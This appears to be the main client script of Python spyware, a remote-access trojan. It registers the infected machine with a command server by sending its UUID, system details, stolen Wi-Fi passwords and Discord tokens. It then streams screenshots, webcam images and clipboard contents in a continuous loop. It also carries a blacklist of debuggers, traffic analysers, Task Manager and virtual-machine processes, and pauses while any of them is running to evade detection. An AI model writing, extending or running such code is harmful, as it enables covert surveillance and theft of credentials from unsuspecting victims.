import cv2
from numpy import array
from pyautogui import screenshot
from requests import post
from time import sleep
import re
import uuid
import subprocess
import socketio
import io
from PIL import Image
import psutil

from modules.discordgrabber import GetDiscordTokens
from modules.pcinfo import System_information
from modules.wifipasswordsgraber import getPasswords
from modules.clipboardlogger import logger

# Initialize the camera
try:
	camera = cv2.VideoCapture(0, cv2.CAP_DSHOW)
except Exception as e:
	camera = cv2.VideoCapture('NoCamera.avi')

current_machine_id = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()

# Define the IP address of the remote server
remote_server = '127.0.0.1:5000'
protocol = 'http'

# Connecting to server
try:
	sio = socketio.Client()
	sio.connect(f'{protocol}://{remote_server}')

	clientIdreq = post(f'{protocol}://{remote_server}/client', json={"uuid": current_machine_id, "osInfo": System_information().replace("\n", "<br>"), "wifis": getPasswords(), "discordInfo": GetDiscordTokens().replace("\n", "<br>")})
	clientId = clientIdreq.text
	print(clientId)
except Exception as e:
	print(e)
	exit(1)

previous_clipboard_content = ''

#Todo: add process hacker
blacklisted_processes = ["httpdebuggerui", "wireshark", "fiddler", "regedit", "cmd", "taskmgr", "processhacker", "vboxservice", "df5serv", "vboxtray", "vmtoolsd", "vmwaretray", "ida64", "ollydbg", "pestudio", "vmwareuser", "vgauthservice", "vmacthlp", "x96dbg", "vmsrvc", "x32dbg", "vmusrvc", "prl_cc", "prl_tools", "xenservice", "qemu-ga", "joeboxcontrol", "ksdumperclient", "ksdumper", "joeboxserver"]

def is_task_manager_open():
	# Check if Task Manager is running
	for proc in psutil.process_iter(['name']):
		if proc.info['name'].replace('.exe', '').lower() in blacklisted_processes:
			return True
	return False

while True:
	if not is_task_manager_open():
		# screen capture
		try:
			screen = screenshot()
			screen_data = io.BytesIO()
			screen.save(screen_data, "PNG")

			#webhook
			text = {"clientId": clientId, "image": screen_data.getvalue()}
			sio.emit('send_screen', text)
		except Exception as e:
			print(e)

		#camera capture
		try:
			result, frame = camera.read()
			camera_pil = Image.fromarray(frame)
			camera_data = io.BytesIO()
			camera_pil.save(camera_data, format="PNG")

			#webhook
			text = {"clientId": clientId, "image": camera_data.getvalue()}
			sio.emit('send_camera', text)
		except Exception as e:
			print(e)

		# Send the frames to the server
		#img_response = post(f'{protocol}://{remote_server}/send_camera?id={clientId}', data=camera_jpg.tobytes(), headers={'Content-Type': 'image/jpg'})
		#screen_response = post(f'{protocol}://{remote_server}/send_screen?id={clientId}', data=screen_jpg.tobytes(), headers={'Content-Type': 'image/jpg'})
		try:
			logger(sio, clientId)
		except Exception as e:
			print(e)

		sio.sleep(1)
	else:
		print("TASK MANAGER!!!!!")

		sio.sleep(10)